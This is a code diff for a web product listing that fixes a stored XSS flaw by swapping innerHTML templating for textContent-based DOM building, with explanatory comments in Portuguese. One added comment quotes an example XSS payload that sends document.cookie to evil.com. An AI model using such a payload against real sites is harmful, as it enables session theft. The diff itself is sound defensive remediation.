@@ -106,38 +106,51 @@ async function loadCurrentUser() {
   }
 }
 
+// [SEGURANÇA] OWASP A03 – Stored XSS (Cross-Site Scripting Armazenado)
+// A forma vulnerável usava innerHTML com template literal:
+//   item.innerHTML = `<h4>${product.name}</h4>`
+// Isso interpreta o conteúdo do banco como HTML executável. Um atacante com
+// acesso de admin poderia salvar um produto com nome:
+//   <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
+// e esse script executaria no browser de todos os usuários que vissem a listagem.
+//
+// A correção usa textContent: o browser trata o valor como texto puro,
+// qualquer tag HTML é exibida literalmente na tela, nunca executada.
 function productCard(product) {
   const item = document.createElement('article');
   item.className = 'product-item';
-// ============================================================================
-// VULNERABILIDADE: STORED XSS (Cross-Site Scripting Armazenado)
-// ============================================================================
-// FORMA VULNERÁVEL (Atual):
-// O uso de 'innerHTML' confia cegamente no texto vindo da base de dados e
-// transforma-o em código executável no browser do cliente (<script>, <style>).
-  item.innerHTML = `
-    <h4>${product.name}</h4>
-    <p>${product.category}</p>
-    <p>${product.description}</p>
-    <p>R$ ${Number(product.price).toFixed(2)} | Estoque: ${product.stock}</p>
-    <div class="product-actions">
-      <button class="edit">Editar</button>
-      <button class="danger delete">Remover</button>
-    </div>
-  `;
-// FORMA SEGURA:
-// Evitar a interpolação direta de HTML. Devemos criar os elementos DOM
-// via JavaScript e usar a propriedade 'textContent'. O 'textContent' 
-// garante que qualquer tag HTML injetada seja lida apenas como texto inofensivo.
-//
-// Código correto:
-// const title = document.createElement('h4');
-// title.textContent = product.name; // Injeção maliciosa é neutralizada aqui!
-// item.appendChild(title);
-// ... e assim sucessivamente para os restantes campos.
 
-  const editBtn = item.querySelector('.edit');
-  const deleteBtn = item.querySelector('.delete');
+  const title = document.createElement('h4');
+  title.textContent = product.name;
+
+  const category = document.createElement('p');
+  category.textContent = product.category;
+
+  const description = document.createElement('p');
+  description.textContent = product.description;
+
+  const priceStock = document.createElement('p');
+  priceStock.textContent = `R$ ${Number(product.price).toFixed(2)} | Estoque: ${product.stock}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'product-actions';
+
+  const editBtn = document.createElement('button');
+  editBtn.className = 'edit';
+  editBtn.textContent = 'Editar';
+
+  const deleteBtn = document.createElement('button');
+  deleteBtn.className = 'danger delete';
+  deleteBtn.textContent = 'Remover';
+
+  actions.appendChild(editBtn);
+  actions.appendChild(deleteBtn);
+
+  item.appendChild(title);
+  item.appendChild(category);
+  item.appendChild(description);
+  item.appendChild(priceStock);
+  item.appendChild(actions);
 
   editBtn.disabled = !isAdmin();
   deleteBtn.disabled = !isAdmin();
